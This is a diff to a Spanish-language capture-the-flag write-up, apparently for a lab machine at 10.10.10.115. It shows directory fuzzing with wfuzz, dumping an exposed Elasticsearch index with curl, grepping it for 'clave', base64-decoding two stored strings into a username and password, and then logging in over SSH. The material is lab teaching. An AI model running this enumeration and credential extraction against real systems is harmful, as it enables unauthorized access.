@@ -106,17 +106,40 @@ wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-
 
 *000015463:   200        0 L      1 W        2 Ch        "*docroot*"*
 
+Con una búsqueda de la tecnología que esta usando la API `Elasticsearch`, encontramos un método para listar todo el contenido de /quotes:
+
+```
 http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000
+```
 
+Hay muchas líneas, quiero ver si de verdad hay una "key" o "clave" en el pajar:
+
+```
 curl 'http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000' > haystack.txt
+```
 
+```
 cat haystack.txt| grep "clave"
+```
+Encontramos cosas:
 
-"quote" : "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
-"quote" : "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
+*"quote" : "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="*
+
+*"quote" : "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "*
+
+Si las decodeamos:
+
+```
 ❯ echo 'cGFzczogc3BhbmlzaC5pcy5rZXk=' | base64 -d
-pass: spanish.is.key%                                                                                                                                        ❯ echo 'dXNlcjogc2VjdXJpdHkg' |base64 -d
-user: security %
+```
+
+`pass: spanish.is.key%`
+
+```
+❯ echo 'dXNlcjogc2VjdXJpdHkg' |base64 -d
+```
+
+`user: security %`
 
 ssh connect
 
